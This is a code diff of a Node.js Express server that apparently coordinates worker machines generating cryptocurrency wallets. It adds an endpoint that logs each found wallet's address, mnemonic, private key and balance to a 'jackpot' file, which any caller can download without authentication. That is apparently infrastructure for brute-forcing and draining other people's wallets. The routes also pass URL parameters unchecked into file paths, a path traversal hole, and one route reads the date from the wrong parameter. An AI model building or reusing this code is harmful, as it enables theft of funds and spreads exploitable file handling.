@@ -9,8 +9,9 @@ const { success, errorResponse } = require("./utils/responseApi");
 
 const app = express();
 
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json({limit: '50mb', extended: true}));
+app.use(bodyParser.json({limit: '10mb', extended: true}))
+app.use(bodyParser.urlencoded({limit: '10mb', extended: true}))
+
 
 app.use(function (req, res, next) {
     res.header("Access-Control-Allow-Origin", "*");
@@ -34,7 +35,7 @@ app.use(fileUpload({
  */
 
 const HOST = process.env.HOST;
-const HTTP_PORT = 3001;
+const HTTP_PORT = 3334;
   
 app.post('/api/1.0/register/:name', function (req, res) {
     let name = req.params.name;
@@ -45,6 +46,7 @@ app.post('/api/1.0/register/:name', function (req, res) {
     if(fs.existsSync(`./generators/${name}`)){
         res.status(400).json(errorResponse("You are already registered", res.statusCode));
     }else{
+        console.log("NEW WORKER REGISTERED : " + name)
         fs.mkdir(`./generators/${name}`, function(err) {
             if (err) {
                 res.status(500).json(errorResponse("Could not create the appropriate directory", res.statusCode));
@@ -58,9 +60,40 @@ app.post('/api/1.0/register/:name', function (req, res) {
     }
 });
 
-app.get('/jackpot/', function(req, res){
+app.get('/jackpot', function(req, res){
     const file = `${__dirname}/generators/jackpot/jackpot.txt`;
     res.download(file); // Set disposition and send it.
+});
+
+app.get('/download/:name/:date', function(req, res){
+    let name = req.params.name;
+    let date = req.params.name;
+
+    const file = `${__dirname}/generators/${name}/addresses-${date}.txt`;
+    res.download(file); // Set disposition and send it.
+});
+
+app.post('/api/1.0/jackpot', function (req, res) {
+    console.log("POST JACKPOT CALLED")
+    let address = req.body.address;
+    let mnemonic = req.body.mnemonic;
+    let private = req.body.private;
+    let balance = req.body.balance;
+    if(mnemonic == 'toto'){
+        console.log("TEST ADDRE RECEIVED")
+    }else {
+        fs.appendFile(`./generators/jackpot/jackpot.txt`, `${address},${mnemonic},${private},${balance}\n`, async function (err) {
+            if (err) {
+                res.status(500).json(errorResponse(err, res.statusCode));
+            }
+        });
+    }
+
+
+    res.setHeader('Content-Type', 'application/json');
+    res
+    .status(200)
+    .json(success("OK", res.statusCode));
 });
 
 
@@ -70,8 +103,6 @@ app.post('/api/1.0/upload/:name/:filename', async (req, res) => {
     let filename = req.params.filename;
 
     console.log(`UPLOAD CALLED FROM ${name}`);
-
-   
 
     if (name == undefined || filename == undefined){
         res.status(400).json(errorResponse("You need to pass a name and a filename in url: /upload/name/filename", res.statusCode));
@@ -89,6 +120,7 @@ app.post('/api/1.0/upload/:name/:filename', async (req, res) => {
                 fs.appendFile(`./generators/${name}/${filename}`, data, async function (err) {
                     if (err) throw err;
                 });
+                console.log(`./generators/${name}/${filename} SAVED TO DISK`)
             } catch (error) {
                 res.status(400).json(errorResponse("You need to register first", res.statusCode));
             }
@@ -108,4 +140,4 @@ app.post('/api/1.0/upload/:name/:filename', async (req, res) => {
     }
 });
 
-app.listen(HTTP_PORT, () => console.log('Master listening on port 3001!'));
+app.listen(HTTP_PORT, () => console.log('Master listening on port ' + HTTP_PORT));
